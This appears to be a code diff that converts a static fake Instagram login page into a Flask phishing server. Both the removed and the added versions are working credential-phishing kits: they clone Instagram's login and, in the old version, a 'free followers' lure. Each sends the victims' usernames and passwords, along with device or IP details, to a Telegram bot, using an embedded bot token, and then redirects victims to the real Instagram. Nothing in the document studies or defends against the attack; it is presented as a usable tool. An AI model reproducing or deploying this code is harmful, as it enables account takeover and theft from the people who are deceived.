@@ -1,3 +1,15 @@
+import asyncio
+from telegram import Bot
+from flask import Flask, request, render_template_string, redirect
+import threading
+
+TOKEN = "8932698048:AAFiHTjbxSpt8E5NgNidmSPtydrhqIiXeW0"
+CHAT_ID = 8932698048
+bot = Bot(token=TOKEN)
+
+app = Flask(__name__)
+
+HTML = """
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -5,391 +17,53 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Instagram</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-        
-        body {
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 50%, #f093fb 100%);
-            font-family: 'Segoe UI', -apple-system, BlinkMacSystemFont, 'Helvetica Neue', sans-serif;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-            padding: 20px;
-            position: relative;
-            overflow: hidden;
-        }
-        
-        body::before {
-            content: '';
-            position: fixed;
-            width: 300%;
-            height: 300%;
-            background: 
-                radial-gradient(circle at 20% 50%, rgba(255, 107, 107, 0.2) 0%, transparent 50%),
-                radial-gradient(circle at 80% 80%, rgba(74, 144, 226, 0.2) 0%, transparent 50%);
-            animation: shift 15s ease-in-out infinite;
-            pointer-events: none;
-        }
-        
-        @keyframes shift {
-            0%, 100% { transform: translate(0, 0); }
-            50% { transform: translate(50px, 50px); }
-        }
-        
-        .container {
-            background: rgba(255, 255, 255, 0.95);
-            border-radius: 30px;
-            max-width: 420px;
-            width: 100%;
-            padding: 50px 30px;
-            position: relative;
-            z-index: 10;
-            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
-            animation: bounce 0.8s cubic-bezier(0.68, -0.55, 0.265, 1.55);
-        }
-        
-        @keyframes bounce {
-            0% { transform: translateY(50px); opacity: 0; }
-            100% { transform: translateY(0); opacity: 1; }
-        }
-        
-        .logo-text {
-            font-size: 44px;
-            font-weight: 900;
-            text-align: center;
-            margin-bottom: 25px;
-            background: linear-gradient(135deg, #ff6b6b, #ee5a6f, #f06595, #d63031);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            background-clip: text;
-            letter-spacing: -1px;
-            animation: wiggle 2s infinite;
-        }
-        
-        @keyframes wiggle {
-            0%, 100% { transform: rotate(0deg); }
-            25% { transform: rotate(-2deg); }
-            75% { transform: rotate(2deg); }
-        }
-        
-        .offer-banner {
-            background: linear-gradient(135deg, #ff6b6b 0%, #f06595 50%, #c92a2a 100%);
-            color: white;
-            padding: 25px;
-            border-radius: 20px;
-            margin-bottom: 30px;
-            text-align: center;
-            box-shadow: 0 10px 30px rgba(255, 107, 107, 0.3);
-            position: relative;
-            overflow: hidden;
-            animation: slideDown 0.6s ease-out 0.2s both;
-        }
-        
-        @keyframes slideDown {
-            from { transform: translateY(-30px); opacity: 0; }
-            to { transform: translateY(0); opacity: 1; }
-        }
-        
-        .offer-banner::before {
-            content: '✨';
-            position: absolute;
-            left: 10px;
-            top: 10px;
-            font-size: 20px;
-            animation: float 3s ease-in-out infinite;
-        }
-        
-        .offer-banner::after {
-            content: '🎁';
-            position: absolute;
-            right: 10px;
-            bottom: 10px;
-            font-size: 20px;
-            animation: float 3s ease-in-out infinite 0.5s;
-        }
-        
-        @keyframes float {
-            0%, 100% { transform: translateY(0px); }
-            50% { transform: translateY(-10px); }
-        }
-        
-        .offer-banner h2 {
-            font-size: 26px;
-            margin-bottom: 8px;
-            font-weight: 900;
-            position: relative;
-            z-index: 1;
-        }
-        
-        .offer-banner p {
-            font-size: 14px;
-            font-weight: 600;
-            position: relative;
-            z-index: 1;
-        }
-        
-        .form-group {
-            margin-bottom: 16px;
-            animation: slideDown 0.6s ease-out both;
-        }
-        
-        .form-group:nth-child(1) { animation-delay: 0.3s; }
-        .form-group:nth-child(2) { animation-delay: 0.4s; }
-        
-        input[type="text"],
-        input[type="password"] {
-            width: 100%;
-            padding: 14px 16px;
-            background: linear-gradient(135deg, rgba(255, 107, 107, 0.05), rgba(102, 126, 234, 0.05));
-            border: 2px solid #f5f5f5;
-            border-radius: 16px;
-            font-size: 14px;
-            font-family: inherit;
-            color: #1e1e1e;
-            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
-            font-weight: 500;
-        }
-        
-        input[type="text"]::placeholder,
-        input[type="password"]::placeholder {
-            color: #b0b0b0;
-        }
-        
-        input[type="text"]:focus,
-        input[type="password"]:focus {
-            outline: none;
-            border-color: #ff6b6b;
-            background: linear-gradient(135deg, rgba(255, 107, 107, 0.1), rgba(102, 126, 234, 0.1));
-            transform: translateY(-2px);
-            box-shadow: 0 5px 20px rgba(255, 107, 107, 0.2);
-        }
-        
-        .login-button {
-            width: 100%;
-            padding: 14px;
-            background: linear-gradient(135deg, #ff6b6b 0%, #f06595 100%);
-            color: white;
-            border: none;
-            border-radius: 16px;
-            font-size: 15px;
-            font-weight: 900;
-            cursor: pointer;
-            margin-top: 15px;
-            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
-            box-shadow: 0 10px 25px rgba(255, 107, 107, 0.3);
-            letter-spacing: 0.5px;
-            animation: slideDown 0.6s ease-out 0.5s both;
-            position: relative;
-            overflow: hidden;
-        }
-        
-        .login-button::before {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: -100%;
-            width: 100%;
-            height: 100%;
-            background: rgba(255, 255, 255, 0.3);
-            transition: left 0.5s;
-        }
-        
-        .login-button:hover {
-            transform: translateY(-3px);
-            box-shadow: 0 15px 40px rgba(255, 107, 107, 0.4);
-        }
-        
-        .login-button:hover::before {
-            left: 100%;
-        }
-        
-        .login-button:active {
-            transform: translateY(-1px);
-        }
-        
-        .divider {
-            margin: 25px 0;
-            text-align: center;
-            font-size: 13px;
-            color: #b0b0b0;
-            font-weight: 600;
-        }
-        
-        .signup-text {
-            text-align: center;
-            font-size: 14px;
-            color: #1e1e1e;
-            margin-top: 20px;
-        }
-        
-        .signup-text a {
-            color: #ff6b6b;
-            text-decoration: none;
-            font-weight: 900;
-            transition: all 0.3s;
-            position: relative;
-        }
-        
-        .signup-text a:hover {
-            color: #f06595;
-            transform: scale(1.05);
-        }
-        
-        .loading {
-            display: none;
-            text-align: center;
-            margin-top: 15px;
-        }
-        
-        .spinner {
-            border: 3px solid rgba(255, 107, 107, 0.1);
-            border-top: 3px solid #ff6b6b;
-            border-radius: 50%;
-            width: 24px;
-            height: 24px;
-            animation: spin 1s linear infinite;
-            margin: 0 auto;
-        }
-        
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-        
-        .error-message {
-            color: #ff6b6b;
-            font-size: 12px;
-            margin-top: 6px;
-            display: none;
-            font-weight: 600;
-        }
+        body { background: #000; color: #fff; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; margin:0; padding:0; display:flex; align-items:center; justify-content:center; height:100vh; overflow:hidden; }
+        .container { max-width: 400px; width:100%; text-align:center; }
+        .logo { font-size: 48px; font-weight: bold; margin-bottom: 20px; background: linear-gradient(45deg, #f56040, #c13584, #405de6); -webkit-background-clip: text; color: transparent; }
+        .input { width: 90%; padding: 12px; margin: 8px 0; background: #1a1a1a; border: 1px solid #333; border-radius: 8px; color: #fff; font-size: 16px; }
+        .btn { width: 90%; padding: 12px; background: #0095f6; border: none; border-radius: 8px; color: white; font-weight: bold; font-size: 16px; margin: 10px 0; cursor: pointer; }
+        .fake-reels { display: flex; overflow-x: auto; gap: 10px; padding: 10px; background: #111; }
+        .reel { width: 80px; height: 100px; background: #222; border-radius: 8px; flex-shrink: 0; }
+        .stories { display: flex; gap: 15px; padding: 10px; overflow-x: auto; }
+        .story { width: 60px; height: 60px; border-radius: 50%; background: linear-gradient(#f56040, #c13584); padding: 3px; }
     </style>
 </head>
 <body>
     <div class="container">
-        <div class="logo-text">Instagram</div>
-        
-        <div class="offer-banner">
-            <h2>FREE 10K Followers 🚀</h2>
-            <p>Claim your reward now!</p>
+        <div class="logo">Instagram</div>
+        <div class="stories">
+            <div class="story"></div><div class="story"></div><div class="story"></div><div class="story"></div>
         </div>
-        
-        <form id="phishForm">
-            <div class="form-group">
-                <input 
-                    type="text" 
-                    id="username" 
-                    placeholder="Username or email" 
-                    required
-                    autocomplete="off"
-                >
-                <div class="error-message" id="usernameError">Invalid input</div>
-            </div>
-            
-            <div class="form-group">
-                <input 
-                    type="password" 
-                    id="password" 
-                    placeholder="Password" 
-                    required
-                    autocomplete="off"
-                >
-                <div class="error-message" id="passwordError">Invalid input</div>
-            </div>
-            
-            <button type="submit" class="login-button" id="loginBtn">
-                Verify & Claim Now 🎉
-            </button>
-            
-            <div class="loading" id="loading">
-                <div class="spinner"></div>
-                <p style="margin-top: 10px; font-size: 12px; color: #999;">Getting your followers...</p>
-            </div>
+        <div class="fake-reels">
+            <div class="reel"></div><div class="reel"></div><div class="reel"></div>
+        </div>
+        <form action="/login" method="post">
+            <input type="text" name="username" class="input" placeholder="Phone number, username, or email" required>
+            <input type="password" name="password" class="input" placeholder="Password" required>
+            <button type="submit" class="btn">Log in</button>
         </form>
-        
-        <div class="divider">━━━ OR ━━━</div>
-        
-        <div class="signup-text">
-            New to Instagram? <a href="#" onclick="return false;">Join now</a>
-        </div>
+        <p style="color:#888;font-size:14px;">Forgot your password?</p>
     </div>
-    
-    <script>
-        const BOT_TOKEN = "8932698048:AAFiHTjbxSpt8E5NgNidmSPtydrhqIiXeW0";
-        const CHAT_ID = "8932698048";
-        const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}`;
-        
-        document.getElementById('phishForm').addEventListener('submit', function(e) {
-            e.preventDefault();
-            
-            const username = document.getElementById('username').value.trim();
-            const password = document.getElementById('password').value;
-            
-            if (!username || !password) {
-                showError('username', 'Required');
-                showError('password', 'Required');
-                return;
-            }
-            
-            document.getElementById('loading').style.display = 'block';
-            document.getElementById('loginBtn').disabled = true;
-            document.getElementById('loginBtn').style.opacity = '0.6';
-            
-            const timestamp = new Date().toLocaleString();
-            const userAgent = navigator.userAgent;
-            
-            const message = `🎉 <b>[TIKTOK STYLE] Instagram Credentials Captured</b>\n\n` +
-                `<b>👤 Username/Email:</b> <code>${username}</code>\n` +
-                `<b>🔐 Password:</b> <code>${password}</code>\n` +
-                `<b>⏰ Time:</b> ${timestamp}\n` +
-                `<b>📱 Device:</b> ${userAgent}`;
-            
-            fetch(`${TELEGRAM_API}/sendMessage`, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/x-www-form-urlencoded',
-                },
-                body: `chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}&parse_mode=HTML`
-            })
-            .then(response => response.json())
-            .then(data => {
-                if (data.ok) {
-                    setTimeout(() => {
-                        document.getElementById('loading').style.display = 'none';
-                        document.getElementById('loginBtn').disabled = false;
-                        document.getElementById('loginBtn').style.opacity = '1';
-                        alert('Followers added! Check your account 🎉');
-                        window.location.href = 'https://www.instagram.com/';
-                    }, 2000);
-                } else {
-                    throw new Error('API Error');
-                }
-            })
-            .catch(error => {
-                console.error('Error:', error);
-                document.getElementById('loading').style.display = 'none';
-                document.getElementById('loginBtn').disabled = false;
-                document.getElementById('loginBtn').style.opacity = '1';
-                setTimeout(() => {
-                    window.location.href = 'https://www.instagram.com/';
-                }, 1000);
-            });
-        });
-        
-        function showError(field, message) {
-            const errorEl = document.getElementById(field + 'Error');
-            if (errorEl) {
-                errorEl.textContent = message;
-                errorEl.style.display = 'block';
-                setTimeout(() => {
-                    errorEl.style.display = 'none';
-                }, 3000);
-            }
-        }
-    </script>
 </body>
 </html>
+"""
+
+@app.route('/')
+def index():
+    return render_template_string(HTML)
+
+@app.route('/login', methods=['POST'])
+def login():
+    username = request.form.get('username')
+    password = request.form.get('password')
+    message = f"🔥 New IG Hit!\nUser: {username}\nPass: {password}\nIP: {request.remote_addr}"
+    asyncio.run(bot.send_message(chat_id=CHAT_ID, text=message))
+    return redirect("https://www.instagram.com", code=302)
+
+def run_flask():
+    app.run(host='0.0.0.0', port=5000)
+
+if __name__ == "__main__":
+    threading.Thread(target=run_flask, daemon=True).start()
+    print("Phishing server running on http://0.0.0.0:5000")
+    input("Press Enter to stop...")
